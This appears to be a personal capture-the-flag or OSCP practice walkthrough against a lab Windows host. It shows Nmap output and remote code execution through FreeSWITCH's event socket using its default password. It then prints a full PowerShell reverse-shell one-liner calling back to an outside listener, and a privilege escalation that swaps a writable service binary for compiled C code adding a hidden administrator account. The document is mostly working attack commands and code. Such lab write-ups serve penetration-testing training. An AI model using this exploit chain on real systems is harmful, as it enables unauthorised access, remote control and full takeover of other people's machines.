# Nmap

```bash
nmap -Pn -A -T4 -p 80,3389,8021 192.168.165.151                                                                                                                                                                                                                                                                        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 20:11 +0000                                                                                                                                                                                                                                                          
Nmap scan report for 192.168.165.151                                                                                                                                                                                                                                                                                       
Host is up (0.092s latency).                                                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                                                           
PORT     STATE SERVICE          VERSION                                                                                                                                                                                                                                                                                    
80/tcp   open  http             Microsoft IIS httpd 10.0                                                                                                                                                                                                                                                                   
|_http-title: IIS Windows                                                                                                                                                                                                                                                                                                  
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                                                                                                                                                   
| http-methods:                                                                                                                                              
|_  Potentially risky methods: TRACE                                                                                                                         
3389/tcp open  ms-wbt-server    Microsoft Terminal Services                                                                                                                                                                                                                                                                
|_ssl-date: 2026-03-30T20:12:14+00:00; -2s from scanner time.                                                                                                                                                                                                                                                              
| ssl-cert: Subject: commonName=OSCP                                                                                                                                                                                                                                                                                       
| Not valid before: 2026-02-01T12:45:57                                                                                                                                                                                                                                                                                    
|_Not valid after:  2026-08-03T12:45:57                                                                                                                                                                                                                                                                                    
| rdp-ntlm-info:                                                                                                                                                                                                                                                                                                           
|   Target_Name: OSCP                                                                                                                                                                                                                                                                                                      
|   NetBIOS_Domain_Name: OSCP                                                                                                                                                                                                                                                                                              
|   NetBIOS_Computer_Name: OSCP                                                                                                                              
|   DNS_Domain_Name: OSCP                                                                                                                                    
|   DNS_Computer_Name: OSCP                                                                                                                                  
|   Product_Version: 10.0.19041                                                                                                                                                                                                                                                                                            
|_  System_Time: 2026-03-30T20:12:09+00:00                                                                                                                   
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket                                                                                                                                                                                                                                                                
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        
Device type: general purpose                                                                                                                                                                                                                                                                                               
Running (JUST GUESSING): Microsoft Windows 10|2019 (92%)                                                                                                                                                                                                                                                                   
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019                                                                                                                                                                                                                                                   
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (92%), Microsoft Windows 10 1909 - 2004 (85%), Windows Server 2019 (85%)                                                                                                                                                                                           
No exact OS matches for host (test conditions non-ideal).                                                                                                                                                                                                                                                                  
Network Distance: 4 hops                                                                                                                                                                                                                                                                                                   
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                                                                                                           
Host script results:                                                                                                                                                                                                                                                                                                       
|_clock-skew: mean: -2s, deviation: 0s, median: -2s                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                           
TRACEROUTE (using port 80/tcp)                                                                                                                               
HOP RTT      ADDRESS                                                                                                                                         
1   92.57 ms 192.168.45.1                                                                                                                                    
2   92.50 ms 192.168.45.254                                                                                                                                  
3   92.74 ms 192.168.251.1                                                                                                                                   
4   93.33 ms 192.168.165.151                                                                                                                                 
                                                                                                                                                             
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                                                                                                      
Nmap done: 1 IP address (1 host up) scanned in 20.42 seconds                                              
```

## Connect to FreeSWITCH via Netcat
```bash
nc 192.168.165.151 8021
```

## Authenticate with Default Password
```bash
auth ClueCon
```
## Enable Background Job Events (to see command output)
```bash
event plain BACKGROUND_JOB
```
## Confirm RCE
```bash
bgapi system whoami
```

## Start Listener
```bash
nc -lvnp 4444

## Create Shell
https://www.revshells.com/
Powershell # 3
# Must prefix created revshell with "bgapi system"

#Example
bgapi system powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.45.244', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

# Run shell 
# Connection established as chris
```
## Windows Priv Esc

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Results (Looks suspect right?)
KiteService            Running C:\program files\Kite\KiteService.exe 

# Check Privs
icacls "C:\program files\Kite\KiteService.exe"

# Results
C:\program files\Kite\KiteService.exe OSCP\chris:(I)(M)
                                      NT AUTHORITY\SYSTEM:(I)(F)
                                      BUILTIN\Administrators:(I)(F)
                                      BUILTIN\Users:(I)(RX)
                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                      APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

# Create Binary to replace KiteService.exe and Add a user to Administrator Group

```bash
sudo adduser.c

# Script

#include <stdlib.h>
int main ()
{
  int i;
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  return 0;
}

# Compile it with GCC
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Start HTTP Server
python -m http.server 80

# Transfer File and rename it to file we are replacing
Invoke-WebRequest http://192.168.45.244/adduser.exe -OutFile KiteService.exe
# NOTE: This is a POWERSHELL Example

# Replace file
Copy-Item "C:\Users\Public\Documents\KiteService.exe" "C:\Program Files\Kite\KiteService.exe" -Force

# Verify the file was replaced (PowerShell shell)
dir "C:\Program Files\Kite\KiteService.exe"
#NOTE Should show same size of create file in bytes with today's timestamp

# Stop the service and replace the binary (PowerShell shell)
Stop-Service kiteservice -Force

# Start the service to trigger payload (PowerShell shell)
sc start kiteservice

# Verify dave2 was created (PowerShell shell)
Get-LocalGroupMember administrators
# OSCP\dave2 should appear. IF NOT PROCEED

# Restart Box
shutdown /r /t 0

# Verify it worked, and log into box
# Grab Admin Flag
```